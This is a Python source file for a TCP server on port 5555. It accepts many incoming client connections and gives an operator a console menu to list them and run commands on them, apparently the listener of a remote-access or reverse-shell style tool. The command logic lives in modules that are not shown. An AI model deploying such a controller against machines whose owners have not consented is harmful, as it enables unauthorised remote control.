from socket import *
from time import sleep
from server_logic import *
import threading as thread
from gui import *

#Class that handles all the server communication
class Server_Class:
    def __init__(self):
        createTempFolder()
        self.server = socket(AF_INET, SOCK_STREAM)# Define the server socket type
        self.server.bind(("", 5555))# Configure the server ip address and port
        self.server.listen(100)  # listien to max of 100 endpoints
        self.clients = []  # list of online hosts

    # This funcation stop the server.

    def stop_server(self):
        for x in range(0, len(self.clients)):
            self.clients[x][0].close()
        self.server.close()

    # This funcation handles all the commands the server gives.
    # every commnds that has been chosen has a function of its own

    def communication(self):
        menu()
        try:
            while True:
                try:
                    command = input('[' + '\033[31m' +
                                    'Menu' + '\033[0m' ']:> ')
                    if command == "1":
                        list_of_clients(self.clients)  # List Conncted Clients
                    elif command == "2":
                        run_commands(self.clients)  # Run Server Commands
                    elif command == "3":
                        self.stop_server()  # Stop Server from running
                        break
                    elif command == "?":
                        menu()  # Get the server menu
                    else:
                        print("Input Error")
                except Exception as e:
                    print("Error, enter numbers ony.", e)
                    continue
        except Exception as e:
            print(f"Session Ended {e}")

    # Just listen to incoming connations of clients

    def listen_for_new_clients(self):
        try:
            while (True):
                client, address = self.server.accept()
                self.clients.append([client, address])
        except:
            pass
    
    def run(self):
        t = thread.Thread(target=self.listen_for_new_clients,)
        t.start()  # Start listening
        self.communication()  # Server Starts Menu and Communication